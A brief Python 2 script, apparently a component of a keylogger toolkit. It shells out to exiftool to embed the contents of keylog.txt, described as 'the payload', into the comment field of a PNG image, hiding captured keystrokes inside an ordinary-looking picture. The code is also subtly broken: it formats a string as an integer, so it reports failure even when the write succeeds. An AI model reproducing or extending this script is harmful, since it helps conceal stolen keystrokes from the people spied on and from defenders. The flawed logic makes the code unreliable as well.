# -*- coding: utf-8 -*-
# injectExif.py
import os

PATH = "../images/IMG_0005.PNG"
FILESIZE = ""

try:
    FILESIZE = str(os.path.getsize(PATH))
    cmd = 'exiftool "-Comment<=keylog.txt" ' + PATH + ' > /dev/null'
    os.system(cmd)
    print "[+] %s size: %d" % (PATH, FILESIZE)
except:
    print "[+] Failed to write the payload to the comment section of the exif file."
